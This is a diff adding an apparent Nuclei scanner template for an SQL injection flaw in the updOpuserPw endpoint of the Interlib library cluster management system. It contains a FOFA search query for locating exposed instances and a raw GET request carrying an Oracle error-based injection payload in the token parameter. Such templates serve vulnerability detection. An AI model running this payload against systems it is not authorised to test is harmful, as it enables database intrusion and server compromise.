@@ -1,0 +1,48 @@
+id: Tushuguanjiqunguanlixitong-updOpuserPw-sqli
+
+info:
+  name: 图书馆集群管理系统-updOpuserPw-SQL注入漏洞
+  author: candada
+  severity: high
+  description: '图书馆集群管理系统Interlib]是实现同一地区或者同一系统下，对一个图书总馆及下设的N个图书分馆，实现信息资源共享，统一管理。技术上依托于IT技术的发展，基于Web和Internet的B/S模式，实现在线管理。其接口updOpuserPw存在SQl注入漏洞，攻击者可通过该漏洞获取数据库敏感信息，进而控制服务器系统。'
+  reference:
+  - https://mp.weixin.qq.com/s/NxJfTbWWEkQ19I22-IUkJw
+  tags: 2024,图书馆集群管理系统,sqli
+  metadata:
+    max-request: 1
+    fofa-query: 'body="interlib/common/"'
+    verified: true
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe: 
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /interlib3/service/sysop/updOpuserPw?loginid=test&newpassword=12356&token=1%27and+ctxsys.drithsx.sn(1,(select%20MOD(999999,1928)%20from%20dual))=%272 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Cookie: JSESSIONID=023D1767D1C957038E5B47C66C4E1F8F
+    Upgrade-Insecure-Requests: 1
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - "1295"
+    condition: and
+
+
+# Generated From WebFuzzer on 2024-04-29 14:07:08
